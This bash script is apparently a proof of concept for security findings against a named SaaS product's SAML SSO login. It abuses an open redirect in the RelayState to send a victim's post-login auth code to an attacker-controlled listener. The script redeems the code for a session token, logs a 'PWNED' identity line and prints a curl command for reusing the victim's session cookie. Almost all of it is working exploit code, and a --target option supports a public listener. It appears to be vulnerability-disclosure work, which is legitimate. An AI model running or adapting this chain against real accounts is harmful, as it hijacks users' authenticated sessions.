#!/usr/bin/env bash
# End-to-end demo for the ssologin redirect findings (F1/F2 → F3 sink).
#
# Starts a listener on loopback, asks /v2/saml/ssologin for a genuine IdP login
# link whose RelayState carries an attacker redirect, and waits for the victim's
# browser to deliver the auth code after login. The listener redeems the code at
# STS and prints the session it obtained.
#
# Companion to repro-ssologin-redirect.sh (same two shapes, but this one follows
# the redirect through to the session). F3/ACS is exercised as-is; the IdP login
# is the only human step.
#
# Use against a test team in an environment you own, with a test account.
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
LISTENER="${SSOLOGIN_LISTENER:-$SCRIPT_DIR/ssologin-listener.py}"

MODE=f2
TEAM="${TEAM:-acme}"
API="${API:-https://api.eu2.coralogix.com}"
DASH="${DASH:-}"
PORT="${PORT:-8776}"
STS="${STS:-}"
TIMEOUT="${TIMEOUT:-300}"
REDIRECT_HOST="127.0.0.1.nip.io"
TARGET=""
OUT_DIR=""
CODE=""
ACS_URL=""
FLOW_ID=""
FLOW_ID_SET=0
OPEN=0
KEEP=0
SHOW_TOKEN=0

die() {
  echo "error: $*" >&2
  exit 1
}

usage() {
  cat <<'EOF'
Usage: .claude/demo/demo-ssologin-takeover.sh [options]

Starts a loopback listener, prints an IdP login link, and waits for the ACS to
deliver the auth code to it. On capture it redeems the code at STS, calls
/auth/v1/whoami with the resulting session, logs the identity as a `PWNED`
line, and serves a page that autoplays a video and shows the whoami result.

Behind nginx, pass the public URL as --target (nginx must proxy to --port on
loopback); see README.md and nginx.conf.example.

Modes:
  --mode f2            legit Origin + ?redirectUrl=<loopback> (default)
  --mode f1            forged Origin (needs the forger host to resolve to loopback)

Targets:
  --team SLUG          team slug for the dashboard Origin (default: acme)
  --api URL            API base (default: https://api.eu2.coralogix.com)
  --dash URL           dashboard Origin (default: https://$TEAM.app.eu2.coralogix.com)
  --sts URL            STS base for the exchange (default: $API)
  --port PORT          loopback port for the listener (default: 8776)
  --redirect-host H    f1 only: suffix after the team label (default: 127.0.0.1.nip.io)
  --target URL         full redirect target override (default depends on mode)

Run control:
  --timeout SECONDS    how long to wait for the victim login (default: 300)
  --open               open the IdP login link in the default browser
  --keep               leave the listener running after the capture
  --show-token         print the full session token (it is also saved to disk)
  --out-dir DIR        where to keep capture.json / session.jwt / listener.log
  --code CODE          skip the login and redeem this auth code
  --acs-url URL        skip the login and redeem the auth_code in this ACS URL

Output: an auth code and a session token are written under --out-dir with mode 600.
Only do this with your own test account; the session belongs to whoever logs in.
EOF
}

while [ $# -gt 0 ]; do
  case "$1" in
    --mode) MODE=${2:?}; shift 2 ;;
    --team) TEAM=${2:?}; shift 2 ;;
    --api) API=${2:?}; shift 2 ;;
    --dash) DASH=${2:?}; shift 2 ;;
    --sts) STS=${2:?}; shift 2 ;;
    --port) PORT=${2:?}; shift 2 ;;
    --redirect-host) REDIRECT_HOST=${2:?}; shift 2 ;;
    --target) TARGET=${2:?}; shift 2 ;;
    --timeout) TIMEOUT=${2:?}; shift 2 ;;
    --out-dir) OUT_DIR=${2:?}; shift 2 ;;
    --code) CODE=${2:?}; shift 2 ;;
    --acs-url) ACS_URL=${2:?}; shift 2 ;;
    --flow-id) FLOW_ID=${2:?}; FLOW_ID_SET=1; shift 2 ;;
    --open) OPEN=1; shift ;;
    --keep) KEEP=1; shift ;;
    --show-token) SHOW_TOKEN=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown option: $1 (try --help)" ;;
  esac
done

case "$MODE" in
  f1|f2) ;;
  *) die "--mode must be f1 or f2" ;;
esac

command -v curl >/dev/null || die "curl is required"
command -v jq >/dev/null || die "jq is required"
command -v python3 >/dev/null || die "python3 is required"

API=${API%/}
STS=${STS:-$API}
DASH=${DASH:-https://$TEAM.app.eu2.coralogix.com}
if [ -z "$OUT_DIR" ]; then
  OUT_DIR=$(mktemp -d "${TMPDIR:-/tmp}/ssologin-demo.XXXXXX")
fi
mkdir -p "$OUT_DIR"
CAPTURE="$OUT_DIR/capture.json"
TOKEN_FILE="$OUT_DIR/session.jwt"
LOG="$OUT_DIR/listener.log"

SERVER_PID=""
cleanup() {
  if [ -n "$SERVER_PID" ] && [ "$KEEP" -eq 0 ]; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
}
trap cleanup EXIT

relay_redirect() {
  jq -r '.login_url // empty' | python3 -c '
import sys, json, urllib.parse as u
login_url = sys.stdin.read().strip()
if not login_url:
    raise SystemExit(0)
query = u.parse_qs(u.urlparse(login_url).query)
raw = query.get("RelayState", [""])[0]
if not raw:
    print("<no RelayState: POST binding or no query>")
    raise SystemExit(0)
try:
    state = json.loads(raw)
except ValueError:
    print("<RelayState is not JSON>")
    raise SystemExit(0)
print((state.get("otherData") or {}).get("redirectUrl", ""))'
}

print_summary() {
  local capture=$1
  echo
  echo "--- captured ------------------------------------------------"
  jq -r '
    "  auth code:   received (\(.auth_code_length // 0) chars) via \(.via // "?")",
    "  login flow:  \(.login_flow_id // "-")",
    "  exchange:    HTTP \(.exchange_http_status // "?")",
    (if .global_session_token then
       "  session:     HTTP \(.session_http_status // "?")" +
       (if (.session | type) == "object"
        then ", active=\(.session.active), expires_in=\(.session.expires_in)s"
        else "" end)
     else
       "  session:     NOT obtained"
     end),
    (if (.session | type) == "object" then
       "  username:        \(.session.active_contexts[0].username // "?")",
       "  user_account_id: \(.session.active_contexts[0].user_account_id // "?")",
       "  mfa_verified:    \(.session.active_contexts[0].mfa_verified // "?")",
       "  login_methods:   \((.session.active_contexts[0].login_methods // []) | join(", "))"
     else empty end),
    (if ((.global_session_token // "") == "") and (.exchange_body | type) == "object"
     then "  exchange error: \(.exchange_body.error // .exchange_body | tostring)"
     else empty end)
  ' "$capture"

  if jq -e '.global_session_token' "$capture" >/dev/null 2>&1; then
    jq -r '.global_session_token' "$capture" > "$TOKEN_FILE"
    chmod 600 "$TOKEN_FILE"
    if [ "$SHOW_TOKEN" -eq 1 ]; then
      echo "  token:          $(cat "$TOKEN_FILE")"
    else
      echo "  token:          $(cut -c1-24 "$TOKEN_FILE")…  (full token: $TOKEN_FILE)"
    fi
    echo
    echo "Reuse that session as the victim:"
    echo "  curl -sS -H \"Cookie: coralogix_global_session=\$(cat $TOKEN_FILE)\" \\"
    echo "    $API/auth/v1/session | jq"
    echo
    echo "  Or paste it into a browser as the coralogix_global_session cookie for"
    echo "  the API origin, then open the dashboard."
  else
    echo
    echo "No session token in the capture. Full response:"
    sed -n '1,40p' "$capture"
  fi
  echo "-------------------------------------------------------------"
  echo "artifacts: $OUT_DIR"
}

# One-shot modes: no listener, no browser.
if [ -n "$CODE" ] || [ -n "$ACS_URL" ]; then
  args=(exchange --sts "$STS" --out "$CAPTURE")
  [ -n "$CODE" ] && args+=(--code "$CODE")
  [ -n "$ACS_URL" ] && args+=(--acs-url "$ACS_URL")
  [ "$FLOW_ID_SET" -eq 1 ] && args+=(--flow-id "$FLOW_ID")
  python3 -u "$LISTENER" "${args[@]}" || true
  print_summary "$CAPTURE"
  exit 0
fi

[ -n "$FLOW_ID" ] || FLOW_ID="demo-$(date -u +%Y%m%dT%H%M%SZ)-$$"

[ -n "$TARGET" ] || {
  if [ "$MODE" = f1 ]; then
    TARGET="http://$TEAM.$REDIRECT_HOST:$PORT"
  else
    TARGET="http://127.0.0.1:$PORT"
  fi
}

python3 -u "$LISTENER" serve --bind 127.0.0.1 --port "$PORT" \
  --sts "$STS" --out "$CAPTURE" >"$LOG" 2>&1 &
SERVER_PID=$!

ready=0
for _ in $(seq 1 50); do
  if curl -fsS "http://127.0.0.1:$PORT/healthz" >/dev/null 2>&1; then
    ready=1
    break
  fi
  kill -0 "$SERVER_PID" 2>/dev/null || break
  sleep 0.1
done
if [ "$ready" -ne 1 ]; then
  cat "$LOG" >&2 || true
  die "listener did not start on 127.0.0.1:$PORT"
fi

echo "Listener:    http://127.0.0.1:$PORT  (loopback only)"
echo "Redirect:    $TARGET"
echo "API:         $API"
echo "STS:         $STS"
echo "Login flow:  $FLOW_ID"
echo

if [ "$MODE" = f1 ]; then
  echo "F1: forged Origin ($TARGET), no query parameter"
  body_file="$OUT_DIR/ssologin.json"
  status=$(curl -sS -o "$body_file" -w '%{http_code}' \
    -H "Origin: $TARGET" -H "X-Login-Flow-Id: $FLOW_ID" \
    "$API/v2/saml/ssologin") || die "ssologin request failed"
else
  echo "F2: legit Origin ($DASH) + redirectUrl=$TARGET"
  body_file="$OUT_DIR/ssologin.json"
  status=$(curl -sS -o "$body_file" -w '%{http_code}' \
    -H "Origin: $DASH" -H "X-Login-Flow-Id: $FLOW_ID" -G \
    --data-urlencode "redirectUrl=$TARGET" \
    "$API/v2/saml/ssologin") || die "ssologin request failed"
fi

if [ "$status" != "200" ]; then
  echo "ssologin returned HTTP $status:" >&2
  cat "$body_file" >&2
  if [ "$status" = "404" ]; then
    echo "hint: no eligible SAML config for team '$TEAM' (or the team slug is wrong)" >&2
  elif [ "$status" = "400" ]; then
    echo "hint: check that Origin's first label is the team slug and the f1 host resolves" >&2
  fi
  exit 1
fi

login_url=$(jq -r '.login_url // empty' "$body_file")
[ -n "$login_url" ] || die "no login_url in the ssologin response"
printf '%s\n' "$login_url" > "$OUT_DIR/idp_login_url.txt"

reflected=$(relay_redirect < "$body_file" 2>/dev/null || true)
echo "Root cause:  RelayState otherData.redirectUrl = ${reflected:-<none>}"
if [ "$reflected" = "$TARGET" ]; then
  echo "             VULNERABLE: the attacker redirect survives into RelayState"
else
  echo "             not reflected (fixed, or this IdP uses POST binding)"
fi
echo

entry_base=${TARGET%/}
entry_query="team_url=$TEAM&login_flow_id=$FLOW_ID"
case "$entry_base" in
  http://127.0.0.1*|http://localhost*|https://127.0.0.1*|https://localhost*)
    entry_query="$entry_query&origin=$DASH"
    ;;
esac
entry_url="$entry_base/login/select-provider?$entry_query"

echo "Now open the SSO entry link as the victim (the listener mints the IdP"
echo "redirect when you open it; the raw IdP URL is in $OUT_DIR/idp_login_url.txt):"
echo
echo "  $entry_url"
echo

if [ "$OPEN" -eq 1 ]; then
  if command -v open >/dev/null 2>&1; then
    open "$entry_url" || true
  elif command -v xdg-open >/dev/null 2>&1; then
    xdg-open "$entry_url" || true
  fi
fi

echo "Waiting up to ${TIMEOUT}s for the ACS to redirect to $TARGET ..."
deadline=$((SECONDS + TIMEOUT))
while [ ! -s "$CAPTURE" ]; do
  kill -0 "$SERVER_PID" 2>/dev/null || {
    cat "$LOG" >&2 || true
    die "listener exited before a code arrived"
  }
  if [ "$SECONDS" -ge "$deadline" ]; then
    echo
    echo "Timed out. Nothing arrived at $TARGET."
    echo "If you have the auth code, rerun with: --code <code>"
    echo "Listener log: $LOG"
    exit 1
  fi
  sleep 1
done

sleep 1  # let the browser render the listener's page before we stop it
print_summary "$CAPTURE"
